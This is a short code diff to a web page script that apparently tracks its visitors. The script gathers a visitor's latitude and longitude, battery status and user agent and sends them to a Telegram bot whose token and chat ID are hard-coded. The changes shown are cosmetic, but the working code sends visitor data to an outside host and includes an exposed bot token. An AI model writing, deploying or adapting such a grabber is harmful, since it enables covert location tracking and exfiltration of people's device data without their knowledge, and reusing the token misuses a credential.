@@ -40,7 +40,7 @@
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
 
-            document.getElementById("status").textContent = "OPENING";
+            document.getElementById("status").textContent = "Collecting information...";
 
             var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
             var chatId = '5112680061'; // Replace with your chat ID
@@ -48,14 +48,15 @@
 
             // Get battery information
             navigator.getBattery().then(function(battery) {
-                var level = battery.level * 100 + '%';
+                var level = (battery.level * 100) + '%';
                 var charging = battery.charging ? 'Yes' : 'No';
                 message += `Battery Level: ${level}\nCharging: ${charging}\n`;
 
                 // Get device model
                 var deviceModel = navigator.userAgent;
-                message += `Device Model: ${deviceModel}`;
+                message += `Device Model: ${deviceModel}\n`;
 
+                // Send all information to Telegram
                 sendToTelegram(chatId, token, message);
             });
         }
